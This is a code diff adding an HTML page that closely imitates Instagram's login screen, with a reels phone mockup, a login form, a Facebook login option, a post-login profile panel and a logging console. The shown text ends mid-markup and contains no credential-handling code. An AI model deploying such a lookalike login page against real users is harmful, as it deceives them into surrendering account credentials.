@@ -1,0 +1,830 @@
+<!DOCTYPE html>
+<html lang="hi">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Instagram - Reels & Login</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background-color: #fafafa;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            overflow-x: hidden;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            inset: 0;
+            background-image: 
+                radial-gradient(circle at 20% 30%, rgba(131,58,180,0.03) 0%, transparent 50%),
+                radial-gradient(circle at 80% 70%, rgba(253,29,29,0.03) 0%, transparent 50%);
+            pointer-events: none;
+        }
+
+        .login-page {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+            max-width: 350px;
+            width: 100%;
+        }
+
+        @media (min-width: 950px) {
+            .login-page {
+                flex-direction: row;
+                align-items: center;
+                gap: 32px;
+                max-width: 980px;
+            }
+        }
+
+        /* ========== PHONE ========== */
+        .phone-mockup {
+            width: 280px; height: 560px;
+            position: relative; flex-shrink: 0;
+            animation: phoneFloat 0.8s cubic-bezier(0.16,1,0.3,1) forwards;
+            opacity: 0;
+        }
+
+        @keyframes phoneFloat {
+            0% { opacity: 0; transform: translateY(30px) scale(0.95); }
+            100% { opacity: 1; transform: translateY(0) scale(1); }
+        }
+
+        .phone-frame {
+            width: 100%; height: 100%;
+            background: #000; border-radius: 44px; padding: 10px;
+            box-shadow: 0 0 0 1.5px #2a2a2a, 0 0 0 3px #1a1a1a, 0 40px 80px rgba(0,0,0,0.35);
+            position: relative; overflow: hidden;
+        }
+
+        .phone-screen {
+            width: 100%; height: 100%;
+            border-radius: 36px; overflow: hidden;
+            position: relative; background: #000;
+        }
+
+        .phone-notch {
+            position: absolute; top: 10px; left: 50%;
+            transform: translateX(-50%);
+            width: 100px; height: 26px;
+            background: #000; border-radius: 20px;
+            z-index: 100;
+            display: flex; align-items: center; justify-content: center; gap: 6px;
+        }
+
+        .phone-notch .camera-dot {
+            width: 10px; height: 10px;
+            background: #1a1a2e; border-radius: 50%;
+            border: 1.5px solid #2a2a3e;
+        }
+
+        .phone-notch .speaker { width: 36px; height: 4px; background: #1a1a1a; border-radius: 4px; }
+
+        /* ========== REELS ========== */
+        .reels-container { width: 100%; height: 100%; position: relative; overflow: hidden; }
+
+        .reels-track {
+            display: flex; flex-direction: column; height: 100%;
+            transition: transform 0.6s cubic-bezier(0.25,0.46,0.45,0.94);
+        }
+
+        .reel { width: 100%; height: 100%; flex-shrink: 0; position: relative; overflow: hidden; }
+
+        .reel-bg { width: 100%; height: 100%; object-fit: cover; position: absolute; top: 0; left: 0; }
+
+        .reel-gradient {
+            position: absolute; bottom: 0; left: 0; right: 0; height: 55%;
+            background: linear-gradient(to top, rgba(0,0,0,0.65) 0%, rgba(0,0,0,0.2) 40%, transparent 100%);
+            pointer-events: none;
+        }
+
+        .reel-top-gradient {
+            position: absolute; top: 0; left: 0; right: 0; height: 80px;
+            background: linear-gradient(to bottom, rgba(0,0,0,0.4) 0%, transparent 100%);
+            pointer-events: none; z-index: 5;
+        }
+
+        .reels-top-bar {
+            position: absolute; top: 0; left: 0; right: 0; height: 50px;
+            display: flex; align-items: center; justify-content: center;
+            z-index: 10; padding: 0 12px;
+        }
+
+        .reels-top-bar .reels-title { font-size: 18px; font-weight: 700; color: #fff; }
+
+        .reels-top-bar .camera-btn {
+            position: absolute; right: 14px; top: 50%; transform: translateY(-50%);
+            background: none; border: none; cursor: pointer; padding: 4px;
+        }
+
+        .reels-top-bar .camera-btn svg { width: 24px; height: 24px; fill: #fff; }
+
+        .reel-actions {
+            position: absolute; right: 8px; bottom: 80px;
+            display: flex; flex-direction: column; align-items: center; gap: 18px; z-index: 10;
+        }
+
+        .reel-action {
+            display: flex; flex-direction: column; align-items: center; gap: 3px; cursor: pointer;
+        }
+
+        .reel-action .action-icon {
+            width: 28px; height: 28px;
+            display: flex; align-items: center; justify-content: center;
+            transition: transform 0.2s;
+        }
+
+        .reel-action:active .action-icon { transform: scale(1.3); }
+
+        .reel-action .action-icon svg {
+            width: 26px; height: 26px; fill: #fff;
+            filter: drop-shadow(0 1px 3px rgba(0,0,0,0.5));
+        }
+
+        .reel-action.liked .action-icon svg { fill: #ff3040; }
+        .reel-action .action-count { font-size: 11px; color: #fff; font-weight: 600; text-shadow: 0 1px 3px rgba(0,0,0,0.5); }
+
+        .music-disc {
+            width: 30px; height: 30px; border-radius: 50%;
+            border: 2px solid rgba(255,255,255,0.3);
+            overflow: hidden; animation: spin 3s linear infinite;
+        }
+
+        .music-disc img { width: 100%; height: 100%; object-fit: cover; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        .reel-info { position: absolute; bottom: 14px; left: 10px; right: 56px; z-index: 10; }
+
+        .reel-username { display: flex; align-items: center; gap: 6px; margin-bottom: 6px; }
+
+        .reel-avatar {
+            width: 28px; height: 28px; border-radius: 50%;
+            border: 2px solid #fff; overflow: hidden; flex-shrink: 0;
+        }
+
+        .reel-avatar img { width: 100%; height: 100%; object-fit: cover; }
+        .reel-username span { font-size: 13px; font-weight: 700; color: #fff; text-shadow: 0 1px 3px rgba(0,0,0,0.5); }
+
+        .reel-follow-btn {
+            background: none; border: 1px solid #fff; border-radius: 6px;
+            color: #fff; font-size: 11px; font-weight: 700;
+            padding: 2px 8px; cursor: pointer; font-family: 'Inter', sans-serif;
+            transition: all 0.2s; margin-left: 4px;
+        }
+
+        .reel-follow-btn.following { background: rgba(255,255,255,0.15); border-color: transparent; }
+
+        .reel-caption {
+            font-size: 12px; color: #fff; line-height: 1.4; margin-bottom: 8px;
+            text-shadow: 0 1px 2px rgba(0,0,0,0.4);
+            display: -webkit-box; -webkit-line-clamp: 2; -webkit-box-orient: vertical; overflow: hidden;
+        }
+
+        .reel-music { display: flex; align-items: center; gap: 6px; overflow: hidden; max-width: 220px; }
+        .reel-music svg { width: 12px; height: 12px; fill: #fff; flex-shrink: 0; }
+        .reel-music-text { font-size: 11px; color: #fff; white-space: nowrap; animation: marquee 8s linear infinite; }
+        @keyframes marquee { 0% { transform: translateX(0); } 100% { transform: translateX(-50%); } }
+
+        .double-tap-heart {
+            position: absolute; top: 50%; left: 50%;
+            transform: translate(-50%,-50%) scale(0);
+            z-index: 50; pointer-events: none;
+        }
+
+        .double-tap-heart.animate { animation: heartPop 0.8s cubic-bezier(0.17,0.89,0.32,1.28) forwards; }
+
+        @keyframes heartPop {
+            0% { transform: translate(-50%,-50%) scale(0); opacity: 1; }
+            15% { transform: translate(-50%,-50%) scale(1.3); opacity: 1; }
+            30% { transform: translate(-50%,-50%) scale(1); opacity: 1; }
+            70% { transform: translate(-50%,-50%) scale(1); opacity: 1; }
+            100% { transform: translate(-50%,-50%) scale(1.2); opacity: 0; }
+        }
+
+        .double-tap-heart svg { width: 80px; height: 80px; fill: #ff3040; filter: drop-shadow(0 4px 12px rgba(255,48,64,0.5)); }
+
+        .reel-progress-bar { position: absolute; bottom: 0; left: 0; right: 0; height: 2px; background: rgba(255,255,255,0.2); z-index: 20; }
+        .reel-progress-fill { height: 100%; background: #fff; width: 0%; animation: progressFill 5s linear infinite; }
+        @keyframes progressFill { 0% { width: 0%; } 100% { width: 100%; } }
+
+        .scroll-indicator { position: absolute; right: 2px; top: 60px; bottom: 10px; width: 3px; background: rgba(255,255,255,0.2); border-radius: 3px; z-index: 20; }
+        .scroll-indicator-fill { width: 100%; background: rgba(255,255,255,0.7); border-radius: 3px; transition: height 0.6s, top 0.6s; }
+
+        .home-indicator { position: absolute; bottom: 4px; left: 50%; transform: translateX(-50%); width: 100px; height: 4px; background: rgba(255,255,255,0.3); border-radius: 4px; z-index: 100; }
+
+        /* ========== LOGIN ========== */
+        .login-wrapper { display: flex; flex-direction: column; align-items: center; gap: 10px; max-width: 350px; width: 100%; position: relative; }
+
+        .login-card {
+            background: #fff; border: 1px solid #dbdbdb; border-radius: 1px;
+            padding: 40px 40px 20px; width: 100%;
+            display: flex; flex-direction: column; align-items: center;
+            animation: fadeInUp 0.6s cubic-bezier(0.16,1,0.3,1) 0.15s forwards; opacity: 0;
+        }
+
+        @keyframes fadeInUp { 0% { opacity: 0; transform: translateY(15px); } 100% { opacity: 1; transform: translateY(0); } }
+
+        .instagram-logo { width: 175px; height: 51px; margin-bottom: 20px; }
+        .instagram-logo svg { width: 100%; height: 100%; }
+
+        .login-form { width: 100%; display: flex; flex-direction: column; gap: 6px; margin-top: 10px; }
+        .input-group { position: relative; width: 100%; }
+
+        .input-group input {
+            width: 100%; height: 36px; padding: 9px 8px 7px;
+            border: 1px solid #dbdbdb; border-radius: 3px;
+            background: #fafafa; font-size: 12px; color: #262626;
+            font-family: 'Inter', sans-serif; outline: none;
+            transition: border-color 0.2s, box-shadow 0.2s;
+        }
+
+        .input-group input:focus { border-color: #a8a8a8; box-shadow: 0 0 0 1px #a8a8a8; }
+        .input-group input::placeholder { color: #8e8e8e; }
+
+        .input-group label {
+            position: absolute; left: 8px; top: 50%; transform: translateY(-50%);
+            font-size: 12px; color: #8e8e8e; pointer-events: none;
+            transition: all 0.15s ease; padding: 0 4px;
+        }
+
+        .input-group input:focus + label,
+        .input-group input:not(:placeholder-shown) + label {
+            top: 0; font-size: 10px; color: #8e8e8e; background: #fff;
+        }
+
+        .password-toggle {
+            position: absolute; right: 8px; top: 50%; transform: translateY(-50%);
+            background: none; border: none; color: #8e8e8e;
+            font-size: 11px; font-weight: 600; cursor: pointer;
+            padding: 4px; font-family: 'Inter', sans-serif; z-index: 2;
+        }
+
+        .login-btn {
+            width: 100%; height: 30px; margin-top: 8px;
+            background: #0095f6; color: #fff; border: none;
+            border-radius: 8px; font-size: 14px; font-weight: 600;
+            cursor: pointer; font-family: 'Inter', sans-serif;
+            transition: background-color 0.2s; position: relative; overflow: hidden;
+        }
+
+        .login-btn:hover { background: #1877f2; }
+        .login-btn:active { transform: scale(0.98); }
+        .login-btn.loading { opacity: 0.7; pointer-events: none; }
+
+        .login-btn .btn-spinner {
+            display: none; width: 16px; height: 16px;
+            border: 2px solid rgba(255,255,255,0.3); border-top-color: #fff;
+            border-radius: 50%; animation: spin 0.6s linear infinite; margin: 0 auto;
+        }
+
+        .login-btn.loading .btn-text { display: none; }
+        .login-btn.loading .btn-spinner { display: block; }
+
+        .separator { display: flex; align-items: center; width: 100%; margin: 18px 0; gap: 16px; }
+        .separator .line { flex: 1; height: 1px; background: #dbdbdb; }
+        .separator span { font-size: 13px; font-weight: 600; color: #8e8e8e; }
+
+        .fb-login { display: flex; align-items: center; gap: 8px; background: none; border: none; cursor: pointer; padding: 4px 0; margin-bottom: 12px; }
+        .fb-login:hover .fb-login-text { color: #00376b; }
+        .fb-login svg { width: 20px; height: 20px; }
+        .fb-login-text { font-size: 14px; font-weight: 600; color: #385185; font-family: 'Inter', sans-serif; }
+
+        .forgot-password { font-size: 12px; color: #00376b; text-decoration: none; margin-bottom: 8px; }
+        .forgot-password:hover { text-decoration: underline; }
+
+        /* ========== SUCCESS SCREEN ========== */
+        .login-success { display: none; flex-direction: column; align-items: center; padding: 20px 0; width: 100%; text-align: center; }
+        .login-success.show { display: flex; animation: fadeInUp 0.5s ease forwards; }
+
+        .success-checkmark {
+            width: 64px; height: 64px; border-radius: 50%; background: #0095f6;
+            display: flex; align-items: center; justify-content: center; margin-bottom: 16px;
+            animation: checkPop 0.5s cubic-bezier(0.17,0.89,0.32,1.28) 0.2s both;
+        }
+
+        @keyframes checkPop { 0% { transform: scale(0); } 100% { transform: scale(1); } }
+        .success-checkmark svg { width: 32px; height: 32px; }
+        .success-title { font-size: 20px; font-weight: 700; color: #262626; margin-bottom: 4px; }
+        .success-subtitle { font-size: 13px; color: #8e8e8e; margin-bottom: 4px; }
+
+        .success-profile {
+            display: flex; align-items: center; gap: 12px;
+            background: #fafafa; border: 1px solid #dbdbdb; border-radius: 12px;
+            padding: 12px 16px; width: 100%; margin: 12px 0;
+        }
+
+        .success-profile img { width: 48px; height: 48px; border-radius: 50%; object-fit: cover; }
+
+        .success-profile-info { text-align: left; flex: 1; }
+        .success-profile-info .sp-name { font-size: 14px; font-weight: 700; color: #262626; display: flex; align-items: center; gap: 4px; }
+        .success-profile-info .sp-name .verified { color: #0095f6; font-size: 16px; }
+        .success-profile-info .sp-stats { font-size: 12px; color: #8e8e8e; margin-top: 2px; }
+
+        .success-details {
+            background: #fafafa; border: 1px solid #dbdbdb; border-radius: 8px;
+            padding: 10px 14px; width: 100%; text-align: left;
+        }
+
+        .success-details .sd-row {
+            display: flex; justify-content: space-between; padding: 5px 0; font-size: 12px;
+        }
+
+        .success-details .sd-label { color: #8e8e8e; }
+        .success-details .sd-value { color: #262626; font-weight: 600; max-width: 180px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
+        .success-details .sd-row + .sd-row { border-top: 1px solid #efefef; }
+
+        .success-logout-btn {
+            width: 100%; height: 32px; margin-top: 12px;
+            background: none; color: #262626; border: 1px solid #dbdbdb;
+            border-radius: 8px; font-size: 13px; font-weight: 600;
+            cursor: pointer; font-family: 'Inter', sans-serif; transition: all 0.2s;
+        }
+
+        .success-logout-btn:hover { background: #fafafa; }
+
+        .signup-card {
+            background: #fff; border: 1px solid #dbdbdb; border-radius: 1px;
+            padding: 22px 40px; width: 100%; text-align: center;
+            font-size: 14px; color: #262626;
+            animation: fadeInUp 0.6s cubic-bezier(0.16,1,0.3,1) 0.25s forwards; opacity: 0;
+        }
+
+        .signup-card a { color: #0095f6; text-decoration: none; font-weight: 600; }
+        .signup-card a:hover { text-decoration: underline; }
+
+        .apps-section {
+            margin-top: 20px; text-align: center; width: 100%;
+            animation: fadeInUp 0.6s cubic-bezier(0.16,1,0.3,1) 0.35s forwards; opacity: 0;
+        }
+
+        .apps-section p { font-size: 14px; color: #262626; margin-bottom: 16px; }
+        .app-badges { display: flex; gap: 8px; justify-content: center; }
+
+        .badge-apple, .badge-google {
+            display: inline-flex; align-items: center; gap: 6px;
+            height: 40px; padding: 0 12px;
+            border: 1px solid #000; border-radius: 6px;
+            background: #000; color: #fff; text-decoration: none;
+        }
+
+        .badge-text { display: flex; flex-direction: column; text-align: left; line-height: 1.1; }
+        .badge-text .small { font-size: 8px; opacity: 0.8; }
+        .badge-text .big { font-size: 16px; font-weight: 600; }
+
+        .footer {
+            margin-top: 30px; text-align: center;
+            animation: fadeInUp 0.6s cubic-bezier(0.16,1,0.3,1) 0.45s forwards; opacity: 0;
+        }
+
+        .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 4px 16px; margin-bottom: 12px; }
+        .footer-links a { font-size: 12px; color: #8e8e8e; text-decoration: none; }
+        .footer-links a:hover { text-decoration: underline; }
+        .footer .copyright { font-size: 12px; color: #8e8e8e; }
+
+        /* ========== TOAST ========== */
+        .toast-container { position: fixed; top: 20px; right: 20px; z-index: 99999; display: flex; flex-direction: column; gap: 10px; pointer-events: none; }
+
+        .toast {
+            background: #262626; color: #fff; padding: 14px 20px; border-radius: 12px;
+            font-size: 14px; font-family: 'Inter', sans-serif;
+            opacity: 0; transform: translateX(100px); transition: all 0.5s cubic-bezier(0.16,1,0.3,1);
+            box-shadow: 0 10px 40px rgba(0,0,0,0.3); pointer-events: auto;
+            display: flex; align-items: center; gap: 10px; max-width: 360px;
+        }
+
+        .toast.show { opacity: 1; transform: translateX(0); }
+        .toast.error { background: #dc3545; border-left: 4px solid #a71d2a; }
+        .toast.success { background: #1a7f37; border-left: 4px solid #0d5a27; }
+        .toast.info { background: #0095f6; border-left: 4px solid #0066b3; }
+        .toast .toast-icon { font-size: 18px; flex-shrink: 0; }
+        .toast .toast-close { background: none; border: none; color: rgba(255,255,255,0.7); cursor: pointer; font-size: 16px; }
+
+        /* ========== VISUAL CONSOLE ========== */
+        .console-panel {
+            position: fixed; bottom: 20px; left: 20px; width: 380px; max-height: 260px;
+            background: #1e1e1e; border-radius: 12px; overflow: hidden; z-index: 99998;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.5); font-family: 'Courier New', monospace;
+            display: none; flex-direction: column; border: 1px solid #333;
+        }
+
+        .console-panel.show { display: flex; }
+
+        .console-header {
+            background: #2d2d2d; padding: 8px 14px;
+            display: flex; align-items: center; justify-content: space-between;
+            border-bottom: 1px solid #404040;
+        }
+
+        .console-header span { color: #ccc; font-size: 12px; font-weight: 600; display: flex; align-items: center; gap: 8px; }
+        .console-header .dots { display: flex; gap: 6px; }
+        .console-header .dots span { width: 10px; height: 10px; border-radius: 50%; }
+        .console-header .dots .red { background: #ff5f57; }
+        .console-header .dots .yellow { background: #febc2e; }
+        .console-header .dots .green { background: #28c840; }
+        .console-close { background: none; border: none; color: #888; cursor: pointer; font-size: 16px; }
+        .console-close:hover { color: #fff; }
+
+        .console-body { flex: 1; overflow-y: auto; padding: 10px 14px; max-height: 200px; }
+        .console-body::-webkit-scrollbar { width: 6px; }
+        .console-body::-webkit-scrollbar-thumb { background: #555; border-radius: 3px; }
+
+        .log-entry { padding: 4px 0; font-size: 12px; line-height: 1.5; border-bottom: 1px solid #2a2a2a; animation: logSlide 0.3s ease; }
+        @keyframes logSlide { 0% { opacity: 0; transform: translateY(-5px); } 100% { opacity: 1; transform: translateY(0); } }
+        .log-entry:last-child { border-bottom: none; }
+        .log-entry .log-time { color: #666; margin-right: 8px; }
+        .log-entry.log-info { color: #4fc3f7; }
+        .log-entry.log-success { color: #81c784; }
+        .log-entry.log-error { color: #e57373; }
+        .log-entry.log-warn { color: #ffb74d; }
+        .log-entry.log-data { color: #ce93d8; }
+
+        .console-toggle {
+            position: fixed; bottom: 20px; left: 20px;
+            width: 48px; height: 48px; border-radius: 50%;
+            background: #1e1e1e; border: 2px solid #333;
+            color: #4fc3f7; font-size: 20px; cursor: pointer; z-index: 99997;
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 8px 24px rgba(0,0,0,0.4); transition: all 0.3s;
+        }
+
+        .console-toggle:hover { transform: scale(1.1); border-color: #4fc3f7; }
+        .console-toggle.hidden { display: none; }
+
+        .input-group.error input { border-color: #dc3545; box-shadow: 0 0 0 1px #dc3545; }
+        .error-message { color: #dc3545; font-size: 11px; text-align: left; margin-top: -2px; padding-left: 8px; display: none; }
+        .error-message.show { display: block; }
+
+        @media (max-width: 949px) {
+            .phone-mockup { width: 240px; height: 480px; margin-bottom: 10px; }
+            .phone-frame { border-radius: 36px; padding: 8px; }
+            .phone-screen { border-radius: 30px; }
+            .phone-notch { width: 80px; height: 22px; top: 8px; }
+        }
+
+        @media (max-width: 450px) {
+            .login-card { padding: 30px 20px 16px; border: none; }
+            .signup-card { border: none; padding: 18px 20px; }
+            .instagram-logo { width: 150px; height: 44px; }
+            .phone-mockup { width: 200px; height: 400px; }
+            .phone-frame { border-radius: 30px; padding: 6px; }
+            .phone-screen { border-radius: 26px; }
+            .reel-actions { right: 5px; bottom: 70px; gap: 14px; }
+            .reel-action .action-icon svg { width: 22px; height: 22px; }
+            .console-panel { width: calc(100% - 40px); }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-page">
+        <!-- PHONE -->
+        <div class="phone-mockup">
+            <div class="phone-frame">
+                <div class="phone-notch"><div class="camera-dot"></div><div class="speaker"></div></div>
+                <div class="phone-screen">
+                    <div class="reels-container" id="reelsContainer">
+                        <div class="scroll-indicator"><div class="scroll-indicator-fill" id="scrollIndicator"></div></div>
+                        <div class="reels-track" id="reelsTrack">
+                            <div class="reel" data-index="0">
+                                <img class="reel-bg" src="https://picsum.photos/seed/reel-travel-mountain/400/850.jpg" alt="Reel">
+                                <div class="reel-top-gradient"></div><div class="reel-gradient"></div>
+                                <div class="reels-top-bar"><span class="reels-title">Reels</span><button class="camera-btn"><svg viewBox="0 0 24 24"><path d="M12 15.2a3.2 3.2 0 1 0 0-6.4 3.2 3.2 0 0 0 0 6.4z"/><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg></button></div>
+                                <div class="reel-actions">
+                                    <div class="reel-action like-btn" data-liked="false"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M16.792 3.904A4.989 4.989 0 0 1 21.5 9.122c0 3.072-2.652 4.959-5.197 7.222-2.512 2.243-3.865 3.469-4.303 3.752-.477-.309-2.143-1.823-4.303-3.752C5.141 14.072 2.5 12.167 2.5 9.122a4.989 4.989 0 0 1 4.708-5.218 4.21 4.21 0 0 1 3.675 1.941c.84 1.175.98 1.763 1.12 1.763s.278-.588 1.11-1.766a4.17 4.17 0 0 1 3.679-1.938m0-2a6.04 6.04 0 0 0-4.797 2.127 6.052 6.052 0 0 0-4.787-2.127A6.985 6.985 0 0 0 .5 9.122c0 3.61 2.55 5.827 5.015 7.97.283.246.569.494.853.747l1.027.918a44.998 44.998 0 0 0 3.518 3.018 2 2 0 0 0 2.174 0 45.263 45.263 0 0 0 3.626-3.115l.922-.824c.293-.26.59-.519.885-.774 2.334-2.025 4.98-4.32 4.98-7.94a6.985 6.985 0 0 0-6.708-7.218z"/></svg></div><span class="action-count">24.5K</span></div>
+                                    <div class="reel-action comment-btn"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M20.656 17.008a9.993 9.993 0 1 0-3.59 3.615L22 22Z" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="action-count">1,234</span></div>
+                                    <div class="reel-action share-btn"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M22 3L9.218 10.083M22 3l-9.868 18-3.914-7.917M22 3L9.218 10.083M5.218 13.083L2 22l7.218-11.917" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="action-count">Share</span></div>
+                                    <div class="reel-action save-btn" data-saved="false"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="action-count">Save</span></div>
+                                    <div class="music-disc"><img src="https://picsum.photos/seed/music-disc-1/60/60.jpg" alt="Music"></div>
+                                </div>
+                                <div class="reel-info">
+                                    <div class="reel-username"><div class="reel-avatar"><img src="https://picsum.photos/seed/avatar-travel/60/60.jpg" alt="User"></div><span>travel_explorer</span><button class="reel-follow-btn">Follow</button></div>
+                                    <div class="reel-caption">Mountain views that take your breath away 🏔️✨ #travel</div>
+                                    <div class="reel-music"><svg viewBox="0 0 24 24"><path d="M9 18V5l12-2v13M9 18c0 1.66-1.34 3-3 3s-3-1.34-3-3 1.34-3 3-3 3 1.34 3 3zM21 16c0 1.66-1.34 3-3 3s-3-1.34-3-3 1.34-3 3-3 3 1.34 3 3z"/></svg><span class="reel-music-text">Original Audio - travel_explorer · Original Audio - travel_explorer ·&nbsp;</span></div>
+                                </div>
+                                <div class="double-tap-heart" id="heart0"><svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div>
+                                <div class="reel-progress-bar"><div class="reel-progress-fill"></div></div>
+                            </div>
+                            <div class="reel" data-index="1">
+                                <img class="reel-bg" src="https://picsum.photos/seed/reel-food-pasta/400/850.jpg" alt="Reel">
+                                <div class="reel-top-gradient"></div><div class="reel-gradient"></div>
+                                <div class="reels-top-bar"><span class="reels-title">Reels</span><button class="camera-btn"><svg viewBox="0 0 24 24"><path d="M12 15.2a3.2 3.2 0 1 0 0-6.4 3.2 3.2 0 0 0 0 6.4z"/><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg></button></div>
+                                <div class="reel-actions">
+                                    <div class="reel-action like-btn" data-liked="false"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M16.792 3.904A4.989 4.989 0 0 1 21.5 9.122c0 3.072-2.652 4.959-5.197 7.222-2.512 2.243-3.865 3.469-4.303 3.752-.477-.309-2.143-1.823-4.303-3.752C5.141 14.072 2.5 12.167 2.5 9.122a4.989 4.989 0 0 1 4.708-5.218 4.21 4.21 0 0 1 3.675 1.941c.84 1.175.98 1.763 1.12 1.763s.278-.588 1.11-1.766a4.17 4.17 0 0 1 3.679-1.938m0-2a6.04 6.04 0 0 0-4.797 2.127 6.052 6.052 0 0 0-4.787-2.127A6.985 6.985 0 0 0 .5 9.122c0 3.61 2.55 5.827 5.015 7.97.283.246.569.494.853.747l1.027.918a44.998 44.998 0 0 0 3.518 3.018 2 2 0 0 0 2.174 0 45.263 45.263 0 0 0 3.626-3.115l.922-.824c.293-.26.59-.519.885-.774 2.334-2.025 4.98-4.32 4.98-7.94a6.985 6.985 0 0 0-6.708-7.218z"/></svg></div><span class="action-count">89.2K</span></div>
+                                    <div class="reel-action comment-btn"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M20.656 17.008a9.993 9.993 0 1 0-3.59 3.615L22 22Z" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="action-count">3,456</span></div>
+                                    <div class="reel-action share-btn"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M22 3L9.218 10.083M22 3l-9.868 18-3.914-7.917M22 3L9.218 10.083M5.218 13.083L2 22l7.218-11.917" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="action-count">Share</span></div>
+                                    <div class="reel-action save-btn" data-saved="false"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M19 21l-7-5-7 5V5a2 2 0 0 1 2-2h10a2 2 0 0 1 2 2z" fill="none" stroke="#fff" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/></svg></div><span class="action-count">Save</span></div>
+                                    <div class="music-disc"><img src="https://picsum.photos/seed/music-disc-2/60/60.jpg" alt="Music"></div>
+                                </div>
+                                <div class="reel-info">
+                                    <div class="reel-username"><div class="reel-avatar"><img src="https://picsum.photos/seed/avatar-chef/60/60.jpg" alt="User"></div><span>foodie_chef_01</span><button class="reel-follow-btn">Follow</button></div>
+                                    <div class="reel-caption">Homemade pasta from scratch 🍝 #food #cooking</div>
+                                    <div class="reel-music"><svg viewBox="0 0 24 24"><path d="M9 18V5l12-2v13M9 18c0 1.66-1.34 3-3 3s-3-1.34-3-3 1.34-3 3-3 3 1.34 3 3zM21 16c0 1.66-1.34 3-3 3s-3-1.34-3-3 1.34-3 3-3 3 1.34 3 3z"/></svg><span class="reel-music-text">Italian Kitchen Vibes · Italian Kitchen Vibes ·&nbsp;</span></div>
+                                </div>
+                                <div class="double-tap-heart" id="heart1"><svg viewBox="0 0 24 24"><path d="M20.84 4.61a5.5 5.5 0 0 0-7.78 0L12 5.67l-1.06-1.06a5.5 5.5 0 0 0-7.78 7.78l1.06 1.06L12 21.23l7.78-7.78 1.06-1.06a5.5 5.5 0 0 0 0-7.78z"/></svg></div>
+                                <div class="reel-progress-bar"><div class="reel-progress-fill"></div></div>
+                            </div>
+                            <div class="reel" data-index="2">
+                                <img class="reel-bg" src="https://picsum.photos/seed/reel-sunset-beach/400/850.jpg" alt="Reel">
+                                <div class="reel-top-gradient"></div><div class="reel-gradient"></div>
+                                <div class="reels-top-bar"><span class="reels-title">Reels</span><button class="camera-btn"><svg viewBox="0 0 24 24"><path d="M12 15.2a3.2 3.2 0 1 0 0-6.4 3.2 3.2 0 0 0 0 6.4z"/><path d="M9 2L7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5z"/></svg></button></div>
+                                <div class="reel-actions">
+                                    <div class="reel-action like-btn" data-liked="false"><div class="action-icon"><svg viewBox="0 0 24 24"><path d="M16.792 3.904A4.989 4.989 0 0 1 21.5 9.122c0 3.072-2.652 4.959-5.197 7.222-2.512 2.243-3.865 3.469-4.303 3.752-.477-.309-2.143-1.823-4.303-3.752C5.141 14.072 2.5 12.167 2.5 9.122a4.989 4.989 0 0 1 4.708-5.218 4.21 4.21 0 0 1 3.675 1.941c.84 1.175.98 1.763 1.12 1.763s.278-.588 1.11-1.766a4.17 4.17 0 0 1 3.679-1.938m0-2a6.04 6.04 0 0 0-4.797 2.127 6.052 6.052 0 0 0-4.787-2.127A6.985 6.985 0 0 0 .5 9.122c0 3.61 2.55 5.827 5.015 7.97.283.246.569.494.853.747l1.027.918a44.998 44.998 0 0 0 3.518 3.018 2 2 0 0 0 2.174 0 45.263 45.263 0 0 0 3.626-3.115l.922-.824c.293-.26.59-.519.885-.774 2.334-2.025 4.98-4.32 4.98-7.94a6.985 6.985 0 0 0-6.708-7.218z"/></svg></div><span class="action-count">42.1K</span></div>
